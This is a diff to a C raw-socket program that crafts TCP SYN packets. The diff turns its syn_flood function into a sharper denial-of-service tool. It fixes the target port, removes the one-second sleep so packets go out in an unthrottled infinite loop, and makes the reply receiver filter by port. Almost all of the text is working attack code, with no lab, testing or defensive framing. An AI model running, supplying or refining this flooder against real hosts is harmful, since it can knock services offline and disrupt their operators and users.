@@ -10,6 +10,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include "./includes/checksum.h"
+#include "./includes/tcp.h"
 
 #define PACKET_LEN 4096
 #define OPT_SIZE 20
@@ -25,16 +26,6 @@ void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** pac
 	//TCP header
 	struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct iphdr));
 	struct pseudo_header psh;
-	
-	//Data part
-	//data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
-	//strcpy(data , "Paquete custom");
-	
-	//some address resolution
-	/*strcpy(source_ip , source_addr);
-	sin.sin_family = AF_INET;
-	sin.sin_port = htons(port);
-	sin.sin_addr.s_addr = inet_addr (addr);*/
 	
 	//IP Header
 	iph->ihl = 5;
@@ -55,7 +46,7 @@ void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** pac
 	//TCP Header
 	tcph->source = src->sin_port;
 	tcph->dest = dst->sin_port;
-	tcph->seq = htonl(1);
+	tcph->th_seq = htonl(0);
 	tcph->ack_seq = htonl(0);
 	tcph->doff = 10;
 	tcph->fin=0;
@@ -88,10 +79,20 @@ void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** pac
 	free(pseudogram);
 }
 
-int receive_from(int sock, char* buffer, size_t buffer_length)
+int receive_from(int sock, char* buffer, size_t buffer_length, struct sockaddr_in *dst)
 {
+	unsigned short dst_port;
 	int received;
-	received = recvfrom(sock, buffer, buffer_length, 0, NULL, NULL);
+	do
+	{
+		received = recvfrom(sock, buffer, buffer_length, 0, NULL, NULL);
+		if (received < 0)
+			break;
+		memcpy(&dst_port, buffer + 22, sizeof(dst_port));
+	}
+	while (dst_port != dst->sin_port);
+	printf("received bytes: %d\n", received);
+	printf("destination port: %d\n", ntohs(dst->sin_port));
 	return received;
 }
 
@@ -169,12 +170,12 @@ void read_seq_and_ack(const char* packet, uint32_t* seq, uint32_t* ack)
 	printf("acknowledgement number: %lu\n", (unsigned long)*seq);
 }
 
-int syn_flood(int sockfd, char *address_dst, char *address_src){
+int syn_flood(int sockfd, char *address_dst, char *address_src, int port){
 	while(1){
 		// direccion IP de destino
 		struct sockaddr_in daddr;
 		daddr.sin_family = AF_INET;
-		daddr.sin_port = htons(rand() % 65536);
+		daddr.sin_port = htons(port);
 		if (inet_pton(AF_INET, address_dst, &daddr.sin_addr) != 1)
 		{
 			printf("destination IP configuration failed\n");
@@ -194,7 +195,5 @@ int syn_flood(int sockfd, char *address_dst, char *address_src){
 		int packet_len;
 		tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);
 		sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr));
-
-        sleep(1);
     }
 }
